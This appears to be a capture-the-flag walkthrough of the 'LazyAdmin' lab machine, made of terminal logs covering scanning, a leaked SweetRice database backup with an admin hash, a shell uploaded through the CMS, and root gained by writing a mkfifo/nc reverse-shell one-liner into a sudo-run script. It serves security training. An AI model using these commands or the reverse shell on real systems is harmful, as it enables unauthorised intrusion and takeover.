# LazyAdmin

```
┌──(root💀kali)-[/home/kali]
└─# nmap -sV -sC  -T5 10.10.164.232
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-04 02:42 EDT
Warning: 10.10.164.232 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.164.232
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
52848/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.41 seconds

```


```
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.164.232                                                                                                        130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Apr  4 02:49:33 2022
URL_BASE: http://10.10.164.232/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.164.232/ ----
==> DIRECTORY: http://10.10.164.232/content/                                                                                              
+ http://10.10.164.232/index.html (CODE:200|SIZE:11321) 
```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.164.232/content/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,phtml,sh
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.164.232/content/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php,phtml,sh
[+] Timeout:                 10s
===============================================================
2022/04/04 02:54:03 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 323] [--> http://10.10.164.232/content/images/]
/index.php            (Status: 200) [Size: 2199]                                          
/license.txt          (Status: 200) [Size: 15410]                                         
/js                   (Status: 301) [Size: 319] [--> http://10.10.164.232/content/js/]    
/changelog.txt        (Status: 200) [Size: 18013]                                         
/inc                  (Status: 301) [Size: 320] [--> http://10.10.164.232/content/inc/]   

```
## http://10.10.164.232/content/changelog.txt       
v 1.5.0
```
############################################
SweetRice - 簡單的網站管理系統
版本 1.5.0
作者：Hiler Liu steelcal@gmail.com
主頁：http://www.basic-cms.org/
############################################
新網絡 - 適用於 PC 和移動網站創建者的新 SweetRice，輕鬆跟隨新網絡世界。
```

http://10.10.164.232/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql  
```
\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
```
https://crackstation.net/

```

http://10.10.77.128/content/as/?type=ad

登入後在ads處 上傳shell 然後 nc 

http://10.10.77.128/content/inc/ads/


┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nvlp 9999                                                                                                                    130 ⨯
listening on [any] 9999 ...
connect to [10.9.0.149] from (UNKNOWN) [10.10.77.128] 53536
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 10:58:05 up 10 min,  0 users,  load average: 0.17, 0.75, 0.72
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whcih python
/bin/sh: 1: whcih: not found
$ which python
/usr/bin/python
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.149 5554 >/tmp/f" > /etc/copy.sh


```


```
www-data@THM-Chal:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/$ sudo ./usr/bin/perl /home/itguy/backup.pl
sudo ./usr/bin/perl /home/itguy/backup.pl










┌──(root💀kali)-[/home/kali/Desktop]
└─# nc -nvlp 5554                                                                                                                      1 ⨯
listening on [any] 5554 ...
connect to [10.9.0.149] from (UNKNOWN) [10.10.77.128] 52064
# cd home
# ls
itguy




```